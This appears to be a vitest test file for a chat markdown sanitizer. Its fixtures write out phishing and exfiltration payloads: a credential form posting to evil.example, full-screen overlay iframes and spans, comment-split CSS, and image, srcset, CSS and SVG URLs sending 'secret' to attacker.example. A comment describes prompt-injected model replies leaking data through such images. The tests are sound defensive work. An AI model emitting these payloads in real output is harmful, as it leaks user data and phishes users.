import { render } from '@testing-library/react';
/**
 * RENDER-level sanitizer fixtures — the counterpart to
 * ./sanitize-invariant.test.ts, which asserts the SCHEMA.
 *
 * Why both: the schema is not the observable. `hast-util-sanitize` falls back
 * from `attributes[tagName]` to `attributes['*']` for any property the per-tag
 * list omits, so a schema assertion ("`attributes.input` omits `name`") can be
 * green while the attribute still lands in the DOM. That exact gap shipped —
 * `attributes.input` was documented as "EXACTLY the GFM task-list contract and
 * nothing else" and `<input name="password" size="40">` kept both attributes,
 * because defaultSchema carries the whole form vocabulary on `*`.
 *
 * So the rule these fixtures encode: for anything that matters, assert on what
 * comes out of `SimpleMarkdownRenderer` (the CHAT surface — untrusted model
 * output), not on the schema that is supposed to produce it.
 */
import { afterEach, describe, it, expect } from 'vitest';
import { setEmbedAuthAdapter } from '../../../../utils/embed-authed-fetch';
import { RichMarkdownRenderer, SimpleMarkdownRenderer } from '../index';

describe('sanitizer — rendered output on the chat surface', () => {
  it('renders a credential form INERT: no action, no method, no named inputs', () => {
    const md =
      '<form action="https://evil.example/steal" method="post">' +
      '<input name="email" size="40"><input name="password" size="40">' +
      '<button type="submit">Sign in</button></form>';
    const { container } = render(<SimpleMarkdownRenderer content={md} />);

    const form = container.querySelector('form');
    // The tag itself is allowed (escaping it would show markup as prose), but
    // it must carry no submission target and no field identity — with neither,
    // there is nothing for a click to exfiltrate.
    expect(form?.getAttribute('action')).toBeNull();
    expect(form?.getAttribute('method')).toBeNull();
    for (const input of Array.from(container.querySelectorAll('input'))) {
      expect(input.getAttributeNames()).not.toContain('name');
      expect(input.getAttributeNames()).not.toContain('value');
      expect(input.getAttributeNames()).not.toContain('size');
    }
  });

  it('still renders a GFM task list as real checkboxes (positive control)', () => {
    const { container } = render(<SimpleMarkdownRenderer content={'- [x] done\n- [ ] todo\n'} />);
    const boxes = Array.from(container.querySelectorAll('input[type="checkbox"]'));
    expect(boxes).toHaveLength(2);
    expect(boxes[0].hasAttribute('checked')).toBe(true);
    expect(boxes[1].hasAttribute('checked')).toBe(false);
  });

  /**
   * Narrowing `*` must not silently change what authored content renders to.
   * Note the asymmetry this fixture records: the SCHEMA re-allows `name` on
   * `<a>` (see sanitize-invariant.test.ts), but the base `a` renderer builds its
   * own element from `href` + children and never forwards `name`, so a legacy
   * `<a name="…">` anchor does not reach the DOM — and did not before the
   * narrowing either (verified by reverting it). The schema allowance is
   * therefore belt-and-braces, not the reason this renders as it does.
   */
  it('does not change what authored list/anchor markup renders to', () => {
    const { container } = render(
      <SimpleMarkdownRenderer content={'<a name="section-two">anchor</a>\n\n<ol><li value="3">three</li></ol>'} />,
    );
    // Both attributes are absent — and were absent BEFORE `*` was narrowed,
    // because the base renderers rebuild these elements. The content itself is
    // untouched, which is the property that matters.
    expect(container.querySelector('a')?.textContent).toBe('anchor');
    expect(container.querySelector('a')?.getAttribute('name')).toBeNull();
    expect(container.querySelector('li')?.textContent).toBe('three');
    expect(container.querySelector('li')?.getAttribute('value')).toBeNull();
  });
});

/**
 * UI-REDRESS / OVERLAY class. `style` is allowed on the tags a content audit
 * found using it, but the POSITIONING subset of CSS is not decoration — it lifts
 * untrusted markup out of the message body and puts it over the application.
 *
 * All three payloads below rendered verbatim before the guard: an
 * attacker-controlled cross-origin document (or a plain opaque `<span>`)
 * covering the whole viewport above every piece of app chrome, from ONE chat
 * message, i.e. from model output.
 */
describe('sanitizer — positioning styles cannot lift content out of the flow', () => {
  const OVERLAYS: Record<string, string> = {
    'cross-origin iframe':
      '<iframe src="https://evil.example/phish" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647"></iframe>',
    'bare span': '<span style="position:fixed;inset:0;background:#fff;z-index:2147483646">fake ui</span>',
    // React's style parser deletes CSS comments, so these arrive as `position:fixed` etc.
    'comment-split properties':
      '<div style="posi/**/tion:fixed;in/**/set:0;z-/**/index:2147483647">Session expired</div>',
    'comment hiding a semicolon': '<div style="posi/*;*/tion:fixed;top:0;left:0">Session expired</div>',
    'div with sticky': '<div style="position:sticky;top:0;z-index:9999">bar</div>',
  };

  // Through both compositions: the chat surface no longer admits `iframe` at
  // all (it renders as escaped text), the authored one still does.
  for (const [name, md] of Object.entries(OVERLAYS)) {
    for (const [surface, Renderer] of [
      ['chat', SimpleMarkdownRenderer],
      ['authored', RichMarkdownRenderer],
    ] as const) {
      it(`strips the positioning declarations: ${name} (${surface})`, () => {
        const { container } = render(<Renderer content={md} />);
        for (const el of Array.from(container.querySelectorAll('[style]'))) {
          const style = el.getAttribute('style') ?? '';
          expect(style).not.toMatch(/position\s*:\s*(fixed|absolute|sticky)/i);
          expect(style).not.toMatch(/z-index/i);
          expect(style).not.toMatch(/\binset\s*:/i);
        }
      });
    }
  }

  it('keeps ordinary decorative styling on the same element', () => {
    const { container } = render(
      <SimpleMarkdownRenderer
        content={'<div style="background:#eee;padding:8px;text-align:center;position:fixed">note</div>'}
      />,
    );
    const style = container.querySelector('div[style]')?.getAttribute('style') ?? '';
    expect(style).toMatch(/background/);
    expect(style).toMatch(/padding/);
    expect(style).toMatch(/text-align/);
    expect(style).not.toMatch(/position/);
  });
});

/**
 * DATA-LEAK / PHISHING class. An image URL is a request its author receives the
 * moment the message renders, no click needed, so a prompt-injected
 * `![](https://attacker.example/log?d=…)` in a model reply carries out whatever
 * the reply was made to put in it. A third-party `<iframe>` puts the attacker's
 * own page inside the app. On the chat surface media loads only from the app
 * (jsdom's page is `http://localhost:3000`), and `iframe` is not an element at all.
 */
describe('sanitizer — chat media loads only from the app', () => {
  afterEach(() => {
    setEmbedAuthAdapter(null);
  });

  const LEAKS: Record<string, string> = {
    'markdown image': '![chart](https://attacker.example/log?d=secret)',
    'raw img': '<img src="https://attacker.example/log?d=secret" alt="chart">',
    'protocol-relative img': '<img src="//attacker.example/log?d=secret">',
    'img srcset': '<img srcset="/a.png 1x, https://attacker.example/log?d=secret 2x">',
    'picture source': '<picture><source srcset="https://attacker.example/log?d=secret"><img src="/a.png"></picture>',
    audio: '<audio src="https://attacker.example/log?d=secret"></audio>',
    'css background': '<div style="background-image:url(https://attacker.example/log?d=secret)">x</div>',
    'css url split by a comment': '<div style="background:u/**/rl(https://attacker.example/log?d=secret)">x</div>',
    'svg paint and marker attributes':
      '<svg viewBox="0 0 10 10"><rect width="10" height="10" fill="url(https://attacker.example/a.svg#p)" ' +
      'stroke="url(https://attacker.example/b.svg#p)"/><path d="M0 0L9 9" marker-end="url(https://attacker.example/m.svg#m)" ' +
      'clip-path="url(https://attacker.example/c.svg#c)"/></svg>',
    iframe: '<iframe src="https://attacker.example/phish" width="600" height="400"></iframe>',
  };

  for (const [name, md] of Object.entries(LEAKS)) {
    it(`loads nothing from a third party: ${name}`, () => {
      const { container } = render(<SimpleMarkdownRenderer content={md} />);
      expect(container.querySelector('iframe')).toBeNull();
      for (const el of Array.from(container.querySelectorAll('*'))) {
        for (const attr of ['src', 'srcset', 'poster', 'style', 'fill', 'stroke', 'marker-end', 'clip-path']) {
          expect(el.getAttribute(attr) ?? '', `${el.tagName}[${attr}]`).not.toContain('attacker.example');
        }
      }
    });
  }

  it('puts a notice where a third-party image was, and never loads it', () => {
    const { container } = render(
      <SimpleMarkdownRenderer content={'![Quarterly chart](https://attacker.example/c.png?d=secret)'} />,
    );
    expect(container.querySelector('img')).toBeNull();
    const notice = container.querySelector('[data-external-media="image"]');
    expect(notice?.textContent).toContain('Quarterly chart');
    expect(notice?.textContent).toContain('attacker.example');
    expect(notice?.querySelector('button, a, [tabindex]')).toBeNull();
  });

  it('gives a raw <img> without alt text the same notice', () => {
    const { container } = render(<SimpleMarkdownRenderer content={'<img src="//attacker.example/x.png">'} />);
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('[data-external-media="image"]')?.textContent).toContain('Image');
  });

  it('still draws images from the app itself', () => {
    const { container } = render(
      <SimpleMarkdownRenderer
        content={'![a](/api/knowledge-base/images/1)\n\n<img src="http://localhost:3000/content/api/b.png" alt="b">'}
      />,
    );
    const srcs = Array.from(container.querySelectorAll('img')).map(img => img.getAttribute('src'));
    expect(srcs).toHaveLength(2);
    expect(srcs[0]).toContain('/api/knowledge-base/images/1');
    expect(srcs[1]).toContain('/content/api/b.png');
  });

  it('draws images from the gateway the host sanctions (native shell)', () => {
    setEmbedAuthAdapter({ getHeaders: () => ({}), allowedOrigins: ['https://gateway.example'] });
    const { container } = render(<SimpleMarkdownRenderer content={'![a](https://gateway.example/api/x.png)'} />);
    expect(container.querySelector('img')?.getAttribute('src')).toContain('https://gateway.example/api/x.png');
  });

  it('keeps the decoration around a dropped CSS url, and in-document SVG references', () => {
    const { container } = render(
      <SimpleMarkdownRenderer
        content={
          '<div style="padding:8px;background:url(https://attacker.example/x.png)">x</div>\n\n' +
          '<svg viewBox="0 0 10 10"><rect width="10" height="10" style="fill:url(#g)"/></svg>'
        }
      />,
    );
    const divStyle = container.querySelector('div[style]')?.getAttribute('style') ?? '';
    expect(divStyle).toMatch(/padding/);
    expect(divStyle).not.toMatch(/url/);
    expect(container.querySelector('rect')?.getAttribute('style')).toMatch(/fill:\s*url\(#g\)/);
  });

  // mermaid fetches a node's image while it renders, before any scrub of its SVG could act.
  it('holds a diagram that loads a third-party image behind a click', () => {
    const md = '```mermaid\nflowchart TD\n  A@{ img: "https://attacker.example/i.png", label: "x", w: 60, h: 60 }\n```';
    const { container } = render(<SimpleMarkdownRenderer content={md} />);
    expect(container.querySelector('[data-external-media="diagram"]')?.textContent).toContain('attacker.example');
  });

  it('draws a diagram with no shape data without asking', () => {
    const md = '```mermaid\nflowchart TD\n  A["x"] --> B["y"]\n```';
    const { container } = render(<SimpleMarkdownRenderer content={md} />);
    expect(container.querySelector('[data-external-media]')).toBeNull();
  });

  // Rich draws `img` through `MarkdownImage`, which probes the image before it
  // renders one, so the third-party media here is audio: the same `src` rule.
  it('leaves authored content (Rich) its third-party media and embeds', () => {
    const { container } = render(
      <RichMarkdownRenderer
        content={
          '<audio src="https://cdn.example.com/a.mp3" controls></audio>\n\n' +
          '```mermaid\nflowchart TD\n  A@{ img: "https://cdn.example.com/i.png", w: 60, h: 60 }\n```\n\n' +
          '<iframe src="https://embed.example.com/x"></iframe>'
        }
      />,
    );
    expect(container.querySelector('audio')?.getAttribute('src')).toBe('https://cdn.example.com/a.mp3');
    expect(container.querySelector('[data-external-media]')).toBeNull();
    expect(container.querySelector('iframe')?.getAttribute('src')).toBe('https://embed.example.com/x');
  });
});

describe('authored content (Rich) keeps its third-party CSS images and SVG paint servers', () => {
  it('leaves both in the DOM', () => {
    const { container } = render(
      <RichMarkdownRenderer
        content={
          '<div style="background-image:url(https://cdn.example.com/bg.png)">x</div>\n\n' +
          '<svg viewBox="0 0 10 10"><rect width="10" height="10" fill="url(https://cdn.example.com/p.svg#p)"/></svg>'
        }
      />,
    );
    expect(container.querySelector('div[style]')?.getAttribute('style')).toContain('cdn.example.com/bg.png');
    expect(container.querySelector('rect')?.getAttribute('fill')).toContain('cdn.example.com/p.svg');
    expect(container.querySelector('[data-external-media]')).toBeNull();
  });
});

/**
 * The app's utility classes are in the page's CSS, so a class list is a style attribute by other means:
 * `class="fixed inset-0 z-50"` is the full-page overlay the style guard strips. Untrusted content keeps only the
 * classes the markdown pipeline puts on its own elements.
 */
describe('sanitizer — classes on the chat surface', () => {
  it('drops the app\u2019s utility classes, so a class list cannot draw an overlay', () => {
    const { container } = render(
      <SimpleMarkdownRenderer content={'<div class="fixed inset-0 z-50 bg-ods-bg">Session expired</div>'} />,
    );
    expect(container.querySelector('div.fixed, .inset-0, .z-50')).toBeNull();
    expect(container.textContent).toContain('Session expired');
  });

  it('keeps the classes the pipeline emits: footnotes and code languages', () => {
    const { container } = render(
      <SimpleMarkdownRenderer content={'- [x] done\n\nNote[^1]\n\n[^1]: the note\n\n```ts\nconst a = 1;\n```'} />,
    );
    // The list renderers rebuild <ul>/<li> without their classes (as before); the checkbox is what carries the task.
    expect(container.querySelector('input[type="checkbox"]')).not.toBeNull();
    expect(container.querySelector('.footnotes .data-footnote-backref')).not.toBeNull();
    expect(container.innerHTML).toMatch(/language-ts/);
  });

  it('leaves authored content (Rich) its classes', () => {
    const { container } = render(<RichMarkdownRenderer content={'<div class="takeaway">x</div>'} />);
    expect(container.querySelector('div.takeaway')).not.toBeNull();
  });
});

describe('sanitizer — the stand-in cannot be forged', () => {
  it('drops a data-blocked-src the content wrote itself', () => {
    const { container } = render(
      <SimpleMarkdownRenderer
        content={
          '<img src="/ok.png" data-blocked-src="https://attacker.example/f.png" alt="Press Load image to sign in">'
        }
      />,
    );
    expect(container.querySelector('[data-external-media]')).toBeNull();
    expect(container.querySelector('img')?.getAttribute('src')).toBe('/ok.png');
    expect(container.innerHTML).not.toContain('attacker.example');
  });
});
